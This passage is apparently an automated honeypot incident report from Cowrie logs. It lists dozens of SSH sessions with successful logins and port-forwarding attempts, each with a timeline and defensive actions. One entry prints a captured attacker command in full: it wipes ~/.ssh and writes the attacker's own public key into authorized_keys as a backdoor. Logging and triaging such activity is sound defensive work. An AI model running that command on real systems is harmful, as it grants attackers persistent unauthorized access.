| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:50:08` | `cowrie.session.connect` |
| `2026-07-30 13:50:08` | `cowrie.client.version` |
| `2026-07-30 13:50:08` | `cowrie.client.kex` |
| `2026-07-30 13:50:11` | `cowrie.login.success` |
| `2026-07-30 13:50:11` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]124` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91a7bad3d210

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-07-30 13:50 |
| **Last Seen** | 2026-07-30 13:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:50:16` | `cowrie.session.connect` |
| `2026-07-30 13:50:17` | `cowrie.client.version` |
| `2026-07-30 13:50:17` | `cowrie.client.kex` |
| `2026-07-30 13:50:18` | `cowrie.login.success` |
| `2026-07-30 13:50:18` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a80de667bfa

| Field | Detail |
|---|---|
| **Source IP** | `120.234.195[.]41` |
| **First Seen** | 2026-07-30 13:50 |
| **Last Seen** | 2026-07-30 13:50 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:50:23` | `cowrie.session.connect` |
| `2026-07-30 13:50:24` | `cowrie.client.version` |
| `2026-07-30 13:50:24` | `cowrie.client.kex` |
| `2026-07-30 13:50:27` | `cowrie.login.success` |
| `2026-07-30 13:50:30` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.195[.]41` to AbuseIPDB if not already reported
- [ ] Block `120.234.195[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-995a39763bf5

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-07-30 13:51 |
| **Last Seen** | 2026-07-30 13:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:51:44` | `cowrie.session.connect` |
| `2026-07-30 13:51:45` | `cowrie.client.version` |
| `2026-07-30 13:51:45` | `cowrie.client.kex` |
| `2026-07-30 13:51:47` | `cowrie.login.success` |
| `2026-07-30 13:51:48` | `cowrie.direct-tcpip.request` |
| `2026-07-30 13:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5129d82a819e

| Field | Detail |
|---|---|
| **Source IP** | `45.169.200[.]254` |
| **First Seen** | 2026-07-30 13:59 |
| **Last Seen** | 2026-07-30 14:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:59:55` | `cowrie.session.connect` |
| `2026-07-30 13:59:55` | `cowrie.client.version` |
| `2026-07-30 13:59:55` | `cowrie.client.kex` |
| `2026-07-30 13:59:56` | `cowrie.login.success` |
| `2026-07-30 13:59:57` | `cowrie.session.params` |
| `2026-07-30 13:59:57` | `cowrie.command.input` |
| `2026-07-30 13:59:57` | `cowrie.command.failed` |
| `2026-07-30 13:59:57` | `cowrie.log.closed` |
| `2026-07-30 13:59:58` | `cowrie.session.params` |
| `2026-07-30 13:59:58` | `cowrie.command.input` |
| `2026-07-30 13:59:58` | `cowrie.session.file_download` |
| `2026-07-30 13:59:58` | `cowrie.log.closed` |
| `2026-07-30 14:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.200[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.169.200[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a2f59c549b0

| Field | Detail |
|---|---|
| **Source IP** | `45.169.200[.]254` |
| **First Seen** | 2026-07-30 13:59 |
| **Last Seen** | 2026-07-30 13:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:59:58` | `cowrie.session.connect` |
| `2026-07-30 13:59:58` | `cowrie.client.version` |
| `2026-07-30 13:59:58` | `cowrie.client.kex` |
| `2026-07-30 13:59:59` | `cowrie.login.success` |
| `2026-07-30 13:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.200[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.169.200[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44472f35de10

| Field | Detail |
|---|---|
| **Source IP** | `45.169.200[.]254` |
| **First Seen** | 2026-07-30 13:59 |
| **Last Seen** | 2026-07-30 14:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 13:59:59` | `cowrie.session.connect` |
| `2026-07-30 13:59:59` | `cowrie.client.version` |
| `2026-07-30 13:59:59` | `cowrie.client.kex` |
| `2026-07-30 14:00:00` | `cowrie.login.success` |
| `2026-07-30 14:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.200[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.169.200[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99a9ad3c897

| Field | Detail |
|---|---|
| **Source IP** | `91.144.158[.]62` |
| **First Seen** | 2026-07-30 14:05 |
| **Last Seen** | 2026-07-30 14:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:05:45` | `cowrie.session.connect` |
| `2026-07-30 14:05:45` | `cowrie.client.version` |
| `2026-07-30 14:05:45` | `cowrie.client.kex` |
| `2026-07-30 14:05:46` | `cowrie.login.success` |
| `2026-07-30 14:05:47` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.144.158[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.144.158[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f690a4c198

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 14:12 |
| **Last Seen** | 2026-07-30 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:12:00` | `cowrie.session.connect` |
| `2026-07-30 14:12:00` | `cowrie.client.version` |
| `2026-07-30 14:12:01` | `cowrie.client.kex` |
| `2026-07-30 14:12:01` | `cowrie.login.success` |
| `2026-07-30 14:12:01` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:12:01` | `cowrie.direct-tcpip.data` |
| `2026-07-30 14:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2076ef6cb0e8

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-07-30 14:16 |
| **Last Seen** | 2026-07-30 14:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:16:36` | `cowrie.session.connect` |
| `2026-07-30 14:16:36` | `cowrie.client.version` |
| `2026-07-30 14:16:36` | `cowrie.client.kex` |
| `2026-07-30 14:16:39` | `cowrie.login.success` |
| `2026-07-30 14:16:40` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f15028f9db

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 14:16 |
| **Last Seen** | 2026-07-30 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:16:55` | `cowrie.session.connect` |
| `2026-07-30 14:16:55` | `cowrie.client.version` |
| `2026-07-30 14:16:55` | `cowrie.client.kex` |
| `2026-07-30 14:16:55` | `cowrie.login.success` |
| `2026-07-30 14:16:55` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:16:56` | `cowrie.direct-tcpip.data` |
| `2026-07-30 14:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e21b823a663

| Field | Detail |
|---|---|
| **Source IP** | `218.29.196[.]162` |
| **First Seen** | 2026-07-30 14:25 |
| **Last Seen** | 2026-07-30 14:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:25:45` | `cowrie.session.connect` |
| `2026-07-30 14:25:46` | `cowrie.client.version` |
| `2026-07-30 14:25:46` | `cowrie.client.kex` |
| `2026-07-30 14:25:49` | `cowrie.login.success` |
| `2026-07-30 14:25:50` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.196[.]162` to AbuseIPDB if not already reported
- [ ] Block `218.29.196[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea18775230f1

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]62` |
| **First Seen** | 2026-07-30 14:25 |
| **Last Seen** | 2026-07-30 14:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:25:57` | `cowrie.session.connect` |
| `2026-07-30 14:25:57` | `cowrie.client.version` |
| `2026-07-30 14:25:57` | `cowrie.client.kex` |
| `2026-07-30 14:25:59` | `cowrie.login.success` |
| `2026-07-30 14:26:00` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]62` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f970df736407

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 14:31 |
| **Last Seen** | 2026-07-30 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:31:53` | `cowrie.session.connect` |
| `2026-07-30 14:31:53` | `cowrie.client.version` |
| `2026-07-30 14:31:53` | `cowrie.client.kex` |
| `2026-07-30 14:31:54` | `cowrie.login.success` |
| `2026-07-30 14:31:54` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:31:54` | `cowrie.direct-tcpip.data` |
| `2026-07-30 14:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6f3f9217b1c

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-30 14:32 |
| **Last Seen** | 2026-07-30 14:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:32:26` | `cowrie.session.connect` |
| `2026-07-30 14:32:27` | `cowrie.client.version` |
| `2026-07-30 14:32:27` | `cowrie.client.kex` |
| `2026-07-30 14:32:28` | `cowrie.login.success` |
| `2026-07-30 14:32:28` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:32:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abbbaa366e04

| Field | Detail |
|---|---|
| **Source IP** | `223.107.72[.]234` |
| **First Seen** | 2026-07-30 14:41 |
| **Last Seen** | 2026-07-30 14:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:41:10` | `cowrie.session.connect` |
| `2026-07-30 14:41:11` | `cowrie.client.version` |
| `2026-07-30 14:41:11` | `cowrie.client.kex` |
| `2026-07-30 14:41:13` | `cowrie.login.success` |
| `2026-07-30 14:41:14` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.72[.]234` to AbuseIPDB if not already reported
- [ ] Block `223.107.72[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fedaebca94c7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 14:49 |
| **Last Seen** | 2026-07-30 14:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:49:13` | `cowrie.session.connect` |
| `2026-07-30 14:49:13` | `cowrie.client.version` |
| `2026-07-30 14:49:13` | `cowrie.client.kex` |
| `2026-07-30 14:49:13` | `cowrie.login.success` |
| `2026-07-30 14:49:13` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:49:13` | `cowrie.direct-tcpip.data` |
| `2026-07-30 14:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab1daf97fa4

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-07-30 14:50 |
| **Last Seen** | 2026-07-30 14:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:50:36` | `cowrie.session.connect` |
| `2026-07-30 14:50:37` | `cowrie.client.version` |
| `2026-07-30 14:50:37` | `cowrie.client.kex` |
| `2026-07-30 14:50:40` | `cowrie.login.success` |
| `2026-07-30 14:50:40` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b12f2a3a29d8

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]145` |
| **First Seen** | 2026-07-30 14:50 |
| **Last Seen** | 2026-07-30 14:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:50:47` | `cowrie.session.connect` |
| `2026-07-30 14:50:48` | `cowrie.client.version` |
| `2026-07-30 14:50:48` | `cowrie.client.kex` |
| `2026-07-30 14:50:50` | `cowrie.login.success` |
| `2026-07-30 14:50:51` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]145` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5255d52125f

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-07-30 14:58 |
| **Last Seen** | 2026-07-30 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:58:23` | `cowrie.session.connect` |
| `2026-07-30 14:58:24` | `cowrie.client.version` |
| `2026-07-30 14:58:24` | `cowrie.client.kex` |
| `2026-07-30 14:58:27` | `cowrie.login.success` |
| `2026-07-30 14:58:27` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66953f42b578

| Field | Detail |
|---|---|
| **Source IP** | `203.198.129[.]123` |
| **First Seen** | 2026-07-30 14:58 |
| **Last Seen** | 2026-07-30 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:58:33` | `cowrie.session.connect` |
| `2026-07-30 14:58:34` | `cowrie.client.version` |
| `2026-07-30 14:58:34` | `cowrie.client.kex` |
| `2026-07-30 14:58:36` | `cowrie.login.success` |
| `2026-07-30 14:58:37` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.129[.]123` to AbuseIPDB if not already reported
- [ ] Block `203.198.129[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43077ffd6d97

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-30 14:58 |
| **Last Seen** | 2026-07-30 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 14:58:33` | `cowrie.session.connect` |
| `2026-07-30 14:58:34` | `cowrie.client.version` |
| `2026-07-30 14:58:34` | `cowrie.client.kex` |
| `2026-07-30 14:58:36` | `cowrie.login.success` |
| `2026-07-30 14:58:36` | `cowrie.direct-tcpip.request` |
| `2026-07-30 14:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daf8a84945f9

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-07-30 15:00 |
| **Last Seen** | 2026-07-30 15:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:00:57` | `cowrie.session.connect` |
| `2026-07-30 15:00:57` | `cowrie.client.version` |
| `2026-07-30 15:00:57` | `cowrie.client.kex` |
| `2026-07-30 15:00:58` | `cowrie.login.success` |
| `2026-07-30 15:00:59` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70acd66ae3b1

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-30 15:01 |
| **Last Seen** | 2026-07-30 15:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:01:04` | `cowrie.session.connect` |
| `2026-07-30 15:01:05` | `cowrie.client.version` |
| `2026-07-30 15:01:05` | `cowrie.client.kex` |
| `2026-07-30 15:01:06` | `cowrie.login.success` |
| `2026-07-30 15:01:07` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fc808ce2ab

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-30 15:02 |
| **Last Seen** | 2026-07-30 15:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 15:02:32` | `cowrie.session.connect` |
| `2026-07-30 15:02:32` | `cowrie.client.version` |
| `2026-07-30 15:02:32` | `cowrie.client.kex` |
| `2026-07-30 15:02:34` | `cowrie.login.success` |
| `2026-07-30 15:02:35` | `cowrie.direct-tcpip.request` |
| `2026-07-30 15:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
